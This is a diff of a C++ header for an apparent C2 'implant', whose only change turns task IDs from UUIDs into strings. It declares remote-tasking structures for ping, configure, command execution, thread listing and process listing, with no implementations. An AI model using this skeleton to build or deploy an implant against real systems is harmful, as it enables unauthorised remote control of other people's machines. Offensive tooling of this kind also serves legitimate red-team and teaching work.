@@ -11,7 +11,6 @@
 #include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/ptree.hpp>
 
-
 // Define implant configuration
 struct Configuration {
 	Configuration(double meanDwell, bool isRunning);
@@ -26,23 +25,23 @@ struct Configuration {
 // PingTask
 // -------------------------------------------------------------------------------------------
 struct PingTask {
-	PingTask(const boost::uuids::uuid& id);
+	PingTask(const std::string& id);
 	constexpr static std::string_view key{ "ping" };
 	[[nodiscard]] Result run() const;
-	const boost::uuids::uuid id;
+	const std::string id;
 };
 
 
 // ConfigureTask
 // -------------------------------------------------------------------------------------------
 struct ConfigureTask {
-	ConfigureTask(const boost::uuids::uuid& id,
+	ConfigureTask(const std::string& id,
 		double meanDwell,
 		bool isRunning,
 		std::function<void(const Configuration&)> setter);
 	constexpr static std::string_view key{ "configure" };
 	[[nodiscard]] Result run() const;
-	const boost::uuids::uuid id;
+	const std::string id;
 private:
 	std::function<void(const Configuration&)> setter;
 	const double meanDwell;
@@ -52,10 +51,10 @@ private:
 // ExecuteTask
 // -------------------------------------------------------------------------------------------
 struct ExecuteTask {
-	ExecuteTask(const boost::uuids::uuid& id, std::string command);
+	ExecuteTask(const std::string& id, std::string command);
 	constexpr static std::string_view key{ "execute" };
 	[[nodiscard]] Result run() const;
-	const boost::uuids::uuid id;
+	const std::string id;
 private:
 	const std::string command;
 };
@@ -63,10 +62,10 @@ private:
 // ListThreadsTask
 // -------------------------------------------------------------------------------------------
 struct ListThreadsTask {
-	ListThreadsTask(const boost::uuids::uuid& id, std::string processId);
+	ListThreadsTask(const std::string& id, std::string processId);
 	constexpr static std::string_view key{ "list-threads" };
 	[[nodiscard]] Result run() const;
-	const boost::uuids::uuid id;
+	const std::string id;
 private:
 	const std::string processId;
 };
@@ -74,10 +73,10 @@ private:
 // ListRunningProcesses
 // -------------------------------------------------------------------------------------------
 struct ListRunningProcesses {
-	ListRunningProcesses(const boost::uuids::uuid& id);
+	ListRunningProcesses(const std::string& id);
 	constexpr static std::string_view key{ "list-processes" };
 	[[nodiscard]] Result run() const;
-	const boost::uuids::uuid id;
+	const std::string id;
 };
 
 // ===========================================================================================
